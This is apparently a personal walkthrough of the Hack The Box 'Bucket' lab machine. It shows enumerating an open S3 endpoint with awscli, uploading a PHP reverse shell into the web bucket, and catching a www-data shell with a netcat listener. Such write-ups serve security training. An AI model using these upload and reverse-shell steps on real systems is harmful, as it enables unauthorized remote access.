![[Pasted image 20210506180005.png]]

### >>Found another host from viewing the source code of the page-

![[Pasted image 20210506180255.png]]


- ### Added s3.bucket.htb to our local host


![[Pasted image 20210506181119.png]]


### >> Installing Awscli on Linux-

```bash
root@napster:~/Documents/HTB/Bucket# apt install awscli
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following additional packages will be installed:
  python3-botocore
The following packages will be upgraded:
  awscli python3-botocore
2 upgraded, 0 newly installed, 0 to remove and 1960 not upgraded.
Need to get 4,951 kB of archives.
After this operation, 7,623 kB of additional disk space will be used.
Do you want to continue? [Y/n] Y
Get:1 http://ftp.harukasan.org/kali kali-rolling/main amd64 awscli all 1.19.1-1 [1,087 kB]
Get:2 http://ftp.harukasan.org/kali kali-rolling/main amd64 python3-botocore all 1.20.0+repack-1 [3,863 kB]                                                  
Fetched 4,951 kB in 10s (500 kB/s)                                                                                                                           
Reading changelogs... Done
<snip>
```

### >>Enumeration through Awscli-

```bash
aws s3 --endpoint-url http://s3.bucket.htb ls
Unable to locate credentials. You can configure credentials by running "aws configure".
```

- ### Need to configure aws after that we can run the above command-

```bash
root@napster:~/Documents/HTB/Bucket# aws s3 --endpoint-url http://s3.bucket.htb ls
2021-05-06 18:19:02 adserver
```

- ### Listing files on adserver-

```bash
root@napster:~/Documents/HTB/Bucket# aws s3 --endpoint-url http://s3.bucket.htb ls s3://adserver
                           PRE images/
2021-05-06 18:27:04       5344 index.html
```

- Listing files inside images/ -
```bash
root@napster:~/Documents/HTB/Bucket# aws s3 --endpoint-url http://s3.bucket.htb ls s3://adserver/images/
2021-05-06 18:29:02      37840 bug.jpg
2021-05-06 18:29:02      51485 cloud.png
2021-05-06 18:29:02      16486 malware.png
```

# >> Finding LFI -

- ### Copying reverse shell.php to the site -

```bash
root@napster:~/Documents/HTB/Bucket# aws s3 --endpoint-url http://s3.bucket.htb cp shell.php s3://adserver/
upload: ./shell.php to s3://adserver/shell.php                
root@napster:~/Documents/HTB/Bucket# aws s3 --endpoint-url http://s3.bucket.htb ls s3://adserver/
                           PRE images/
2021-05-06 18:39:03       5344 index.html
2021-05-06 18:39:13       5494 shell.php

```


- ### Triggering the shell.php and getting a reverse shell-

![[Pasted image 20210506184327.png]]

```bash
root@napster:~/Documents/HTB/Bucket# nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.162] from (UNKNOWN) [10.10.10.212] 53130
Linux bucket 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 22:40:40 up  1:25,  0 users,  load average: 0.13, 0.09, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

